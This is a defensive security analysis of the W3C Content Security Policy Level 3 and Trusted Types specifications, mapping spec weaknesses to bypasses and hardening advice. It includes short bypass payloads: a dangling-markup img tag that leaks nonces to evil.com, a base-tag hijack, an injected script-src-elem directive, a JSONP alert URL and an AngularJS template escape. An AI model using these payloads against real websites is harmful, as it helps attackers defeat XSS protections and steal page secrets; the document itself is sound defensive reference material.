# Content Security Policy (CSP) Specification Security Analysis

> **Analysis Target**: W3C CSP Level 3, Trusted Types API
> **Methodology**: Spec deep dive + real-world attack research (2024-2025)
> **Date**: February 2026

---

## Executive Summary

CSP's effectiveness depends critically on correct configuration and understanding of specification nuances. Key findings: (1) Nonce exfiltration via dangling markup is a **spec-acknowledged** architectural weakness. (2) Malformed policies result in **no enforcement** (fail-open). (3) Duplicate directives ignored with first-occurrence precedence → header injection attacks. (4) Path restrictions deliberately weakened to avoid side-channels. (5) `'strict-dynamic'` trust chains create new surfaces if initial scripts are compromised.

---

## Part I: Specification Architecture

### 1. CSP Enforcement Model (W3C CSP Level 3 §7)

Three-stage enforcement: pre-request check (§7.1), post-request check (§7.2), inline check (§7.3). *"If policy's disposition is 'enforce', then set result to 'Blocked'"* — mandatory, not discretionary.

**Attack Vectors**: Service Worker substitution (bypass pre-request via post-request timing), TOCTOU between check stages, inline check bypass via nonce exfiltration before CSP validation.

### 2. Policy Parsing and Malformation (W3C CSP Level 3 §4.2)

Non-ASCII tokens skipped, duplicate directives ignored (first wins), empty values permitted. *"If serialized could not be parsed, the object's directive set will be empty"* — **fail-open**, not fail-closed.

**Attack Vectors**: Encoding attacks (non-ASCII → token skipping), delimiter confusion (`;`/`,`), directive duplication via header injection overrides security directives, silent policy failure.

**Real case**: $3,500 bounty (2024) — CSP injection via `report-uri` parameter reflection. Attacker injected `;script-src-elem https://evil.com` which overrode `script-src`.

### 3. Nonce Architecture and Dangling Markup (W3C CSP Level 3 §8.1)

Nonces must not be reused, match via byte-for-byte comparison. But spec explicitly warns: *"Attackers can exfiltrate nonces via content attributes"* — HTML parsing occurs before CSP enforcement.

**Dangling Markup Attack**: Injected `<img src='https://evil.com/?` with unclosed attribute causes parser to consume subsequent content (including nonce attributes) until next quote, sending nonce to attacker.

**Defense**: Strict HTML sanitization, `'strict-dynamic'` to reduce nonce exposure, `X-Content-Type-Options: nosniff`.

### 4. Hash-Based Integrity and `unsafe-hashes` (§6.7.2.4)

External scripts match hashes via `integrity` attribute. `'unsafe-hashes'` enables hashes for event handlers, style attributes, `javascript:` URLs — significantly expands attack surface.

**Attack**: If attacker controls `integrity` attribute, they reference malicious scripts matching their own hash. Event handler hash bypass: `<button onclick="exploit()">` executes if hash matches.

**Defense**: Never use `'unsafe-hashes'` in production. Validate that `integrity` attributes contain only trusted hashes.

### 5. `'strict-dynamic'` Trust Chain (§6.7.1)

*"This keyword allows scripts that execute on a page to load additional script via non-parser-inserted `<script>` elements."* Nonce/hash-approved scripts can dynamically create new scripts without nonce/hash. Allowlist entries ignored.

**Attack Vectors**: Script gadgets in trusted libraries (AngularJS, jQuery known bypasses), prototype pollution in trusted library → inject script-loading behavior, dependency chain compromise.

**Defense**: Audit all trusted scripts, avoid script-loading abstractions, use Trusted Types for DOM XSS prevention.

---

## Part II: Directive-Specific Vulnerabilities

### 6. `unsafe-inline` and `unsafe-eval` (W3C CSP Level 3)

Spec explicitly: *"This keyword is a security compromise to be minimized."* `unsafe-inline` permits inline scripts/styles — **completely defeats XSS protection**. `unsafe-eval` permits `eval()`, `Function()`, `setTimeout(string)`. ~70% of CSP policies include `unsafe-inline`.

**Defense**: Never use either in production. Migrate to nonce/hash-based CSP. Use Trusted Types.

### 7. Wildcard and Broad Allowlists (§6.7)

`*`, `https://*`, `*.cdn.com` allow broad origins. If any allowed origin hosts JSONP endpoints, user uploads, or vulnerable libraries → CSP bypass. 94% of allowlist-based CSPs bypassable via public endpoint exploitation.

**Attacks**:
- JSONP: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)` if googleapis.com allowlisted
- CDN: Load Angular 1.6.0 from cdnjs.cloudflare.com → `{{constructor.constructor('alert(1)')()}}`
- Self: Upload malicious.js to `/uploads/` → `<script src="/uploads/malicious.js">`

**Defense**: Avoid wildcards. Use `'strict-dynamic'` with nonces. Audit allowed origins for JSONP/upload endpoints.

### 8. `base-uri` and HTML Injection

Without `base-uri` directive, injected `<base href="https://evil.com/">` redirects all relative URLs (scripts, forms) to attacker domain.

**Defense**: Always include `base-uri 'none'` or `base-uri 'self'`.

### 9. `object-src` and Legacy Plugins

Without `object-src 'none'`, Flash/PDF plugins execute JavaScript despite strict `script-src`. Flash deprecated but PDF XSS still possible.

**Defense**: Always set `object-src 'none'`.

### 10. `default-src` Fallback Gaps (§6.2)

`default-src` serves as fallback for fetch directives, but `base-uri`, `form-action`, `frame-ancestors` don't fall back to it. Missing these directives leaves gaps.

**Best practice CSP**:
```
default-src 'none'; script-src 'nonce-{random}' 'strict-dynamic';
style-src 'nonce-{random}'; img-src 'self' https:; font-src 'self';
connect-src 'self'; frame-src 'none'; object-src 'none';
base-uri 'none'; form-action 'self'; upgrade-insecure-requests;
```

---

## Part III: Advanced Bypass Techniques

### 11. CSP Injection via `report-uri` (§6.2)

If application reflects user input into CSP header (particularly `report-uri`), attackers inject `;` to add directives. `script-src-elem` (Chrome) overrides `script-src` for `<script>` elements.

**Defense**: Never reflect user input into CSP headers. Generate CSP server-side from static config.

### 12. Path Traversal Bypass (§6.7.2.5)

Path matching deliberately weakened: *"to avoid path-based side-channel attacks."* `/../` may bypass `/scripts/` restriction depending on implementation.

**Defense**: Don't rely on path restrictions for security. Use origin-level controls + server-side access controls.

### 13. Nonce Reuse and Caching

Nonce reuse due to caching/CDN misconfiguration → attacker captures nonce from cached page, replays with malicious script.

**Defense**: Generate 128+ bit random nonces per request. `Cache-Control: no-store` for nonce-based pages.

### 14. Service Worker CSP Bypass (§7.2)

Service Workers intercept network requests and return arbitrary responses. Malicious SW substitutes trusted script content while origin appears allowed.

**Defense**: SRI to verify script content, restrict SW registration scope, monitor SW registration events.

### 15. Trusted Types: Next Evolution (W3C Trusted Types API)

`require-trusted-types-for 'script'` enforces DOM sinks only accept Trusted Type objects. Targets DOM XSS (which traditional CSP doesn't fully prevent). Prevents `innerHTML`, `document.write()`, `eval()` from untrusted strings.

**Limitations**: Parser bypasses (HTML parser doesn't invoke assignment APIs), cross-realm issues, script gadgets still exploitable, Chromium-only (not Firefox/Safari as of 2024).

```
Content-Security-Policy:
  script-src 'nonce-{random}' 'strict-dynamic';
  require-trusted-types-for 'script';
  trusted-types default myPolicy;
```

---

## Part IV: Reporting and Privacy

### 16. Violation Reporting Information Leakage (§6.2)

Reports include `blocked-uri`, `violated-directive`, `source-file`, line/column numbers. *"Reports may leak sensitive information through blocked resource URIs."* Cross-origin resources stripped to origin-only.

**Attacks**: Attacker-controlled report endpoint receives sensitive data in blocked URIs, report flooding/DoS to hide real violations, privacy leaks (user paths, internal IPs, session IDs).

**Defense**: HTTPS report endpoints, rate limiting, sanitize URIs before logging.

### 17. Report-Only Mode Misuse

`Content-Security-Policy-Report-Only` generates reports but doesn't block. Left in production indefinitely → false sense of security while XSS remains exploitable.

**Defense**: Use Report-Only only during testing. Establish enforcement transition timeline.

---

## Part V: Best Practices

### 18. Strict CSP: Nonce + `strict-dynamic` (Google/Web.dev)

Recommended by Google, Mozilla, OWASP. Eliminates allowlist bypasses, JSONP/CDN exploitation, path traversal.

```
script-src 'nonce-{RANDOM}' 'strict-dynamic' 'unsafe-inline' https:;
object-src 'none'; base-uri 'none';
```
Modern browsers ignore `'unsafe-inline'` when nonces present. Older browsers fall back to HTTPS allowlist.

### 19. `upgrade-insecure-requests`

Auto-upgrades HTTP → HTTPS for subresources. Doesn't replace HSTS for top-level navigation. Use both together.

### 20. CSP + Subresource Integrity (SRI)

SRI validates script content even if CDN compromised. Detects Service Worker substitution. Combine with strict CSP for defense-in-depth.

---

## Part VI: Attack-Spec-Defense Mapping

| Attack | Spec Weakness | Defense |
|--------|--------------|---------|
| Nonce exfiltration | HTML parsing before CSP enforcement | Strict sanitization, `strict-dynamic` |
| Policy injection | Reflective `report-uri` parameters | Never reflect user input in CSP |
| JSONP bypass | Broad allowlist matching | `strict-dynamic`, no wildcards |
| `unsafe-inline` XSS | Backward compatibility keyword | Never use in production |
| `unsafe-eval` execution | Backward compatibility keyword | Trusted Types, eliminate eval |
| Base tag injection | Missing `base-uri` directive | `base-uri 'none'` |
| Object/embed bypass | Missing `object-src` directive | `object-src 'none'` |
| Script gadgets | `strict-dynamic` trust propagation | Audit scripts, Trusted Types |
| Path traversal | Deliberately weak path matching | Don't rely on path restrictions |
| Service Worker substitution | Pre/post-request timing gap | SRI, monitor SW registration |
| Nonce reuse | Caching | Fresh nonces per request, `no-store` |
| Report info leak | Verbose violation reports | Sanitize URIs, HTTPS endpoints |
| Trusted Types parser bypass | HTML parser doesn't invoke APIs | CSP + TT combined, progressive refactoring |

---

## Security Checklist

**Required**: (1) `script-src` with nonces/hashes (never `unsafe-inline`). (2) `object-src 'none'`. (3) `base-uri 'none'`. (4) `default-src 'none'`.

**Recommended**: (5) `style-src` with nonces. (6) `connect-src` restricting AJAX. (7) `frame-src`/`frame-ancestors`. (8) `form-action`. (9) `upgrade-insecure-requests`.

**Forbidden**: (10) `unsafe-inline` in script-src. (11) `unsafe-eval`. (12) `unsafe-hashes`. (13) Wildcards in script-src. (14) Broad CDN allowlists. (15) User input in CSP headers. (16) Static nonces. (17) HTTP report-uri.

**Nonces**: (18) 128+ bits cryptographically random. (19) Regenerated per request. (20) Not in cached responses.

**Testing**: (21) CSP Evaluator scan. (22) Report-Only before enforcement. (23) Cross-browser testing. (24) SRI for third-party scripts.

---

## Sources

**Specs**: [W3C CSP Level 3](https://w3c.github.io/webappsec-csp/) | [W3C Trusted Types](https://w3c.github.io/trusted-types/dist/spec/)

**Research**: [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) | [PortSwigger CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) | [Intigriti CSP Bypasses](https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses) | [CSP Bypass $3.5k Bounty](https://blog.voorivex.team/a-weird-csp-bypass-led-to-35k-bounty)

**Tools**: [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/) | [Web.dev Strict CSP](https://web.dev/articles/strict-csp) | [CSP.withGoogle.com](https://csp.withgoogle.com/)
